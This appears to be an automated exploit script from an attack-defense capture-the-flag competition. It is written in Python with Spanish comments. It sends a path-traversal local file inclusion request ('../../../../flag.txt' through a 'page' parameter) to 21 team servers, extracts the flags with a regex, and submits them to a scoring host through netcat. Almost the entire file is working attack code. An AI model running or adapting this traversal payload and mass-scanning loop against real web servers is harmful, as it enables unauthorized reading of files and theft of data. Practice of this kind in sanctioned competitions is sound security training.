import requests
import re
import subprocess

n_equipos = 21
targets = [f'10.66.{i}.4' for i in range(1, n_equipos + 1)]
port = 8080

flag_submission_ip = ""

# Regex para flags ("cdm_strings")
flag_pattern = re.compile(r'cdm_[a-zA-Z0-9_]+')

def submit_flag(flag):
    try:
        proc = subprocess.run(
            ["nc", flag_submission_ip, "31337"],
            input=flag.encode(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3
        )
        print(f"[+] Subida flag: {flag.strip()} -> {proc.stdout.decode().strip()}")
    except Exception as e:
        print(f"[!] Error al subir flag: {e}")

for ip in targets:
    url = f"http://{ip}:{port}/index.php?page=../../../../../../flag.txt" #Ajustar ruta para LFI
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200:
            match = flag_pattern.search(r.text)
            if match:
                flag = match.group(0)
                print(f"[+] Flag encontrada en {ip}: {flag}")
                submit_flag(flag)
            else:
                print(f"[-] No se encontró flag en {ip}")
        else:
            print(f"[-] {ip} devolvió status {r.status_code}")
    except Exception as e:
        print(f"[!] Error en {ip}: {e}")
